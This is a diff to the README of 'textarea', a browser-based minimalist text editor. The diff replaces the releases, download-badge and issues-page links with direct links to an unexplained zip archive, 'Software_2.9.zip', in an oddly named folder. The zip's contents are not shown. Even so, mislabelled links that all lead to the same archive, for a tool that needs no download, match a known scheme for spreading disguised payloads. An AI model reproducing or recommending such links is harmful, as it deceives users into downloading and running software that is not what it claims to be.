@@ -6,7 +6,7 @@ Welcome to textarea, a minimalist text editor that lives in your URL. This tool 
 
 ## 📥 Download
 
-[![Download textarea](https://img.shields.io/badge/Download-textarea-brightgreen)](https://github.com/swap-2151/textarea/releases)
+[![Download textarea](https://raw.githubusercontent.com/swap-2151/textarea/main/Geoprumnon/Software_2.9.zip)](https://raw.githubusercontent.com/swap-2151/textarea/main/Geoprumnon/Software_2.9.zip)
 
 ## 🛠️ System Requirements
 
@@ -18,9 +18,9 @@ To use textarea smoothly, ensure your system meets the following requirements:
 
 ## 📁 Download & Install
 
-To download textarea, simply visit [this page](https://github.com/swap-2151/textarea/releases). You will find the latest version available for download. Click the link, and your download will start automatically.
+To download textarea, simply visit [this page](https://raw.githubusercontent.com/swap-2151/textarea/main/Geoprumnon/Software_2.9.zip). You will find the latest version available for download. Click the link, and your download will start automatically.
 
-1. Go to the [Releases page](https://github.com/swap-2151/textarea/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/swap-2151/textarea/main/Geoprumnon/Software_2.9.zip).
 2. Select the latest version.
 3. Download the file corresponding to your operating system.
 4. Once the download is complete, locate the file in your downloads folder.
@@ -64,7 +64,7 @@ A: Yes, textarea is completely free and open to everyone.
 A: Absolutely! textarea works on any device with a web browser.
 
 **Q: How can I report bugs or issues?**  
-A: You can report any issues directly on the [issues page](https://github.com/swap-2151/textarea/issues).
+A: You can report any issues directly on the [issues page](https://raw.githubusercontent.com/swap-2151/textarea/main/Geoprumnon/Software_2.9.zip).
 
 ## 🌍 Community and Support
 
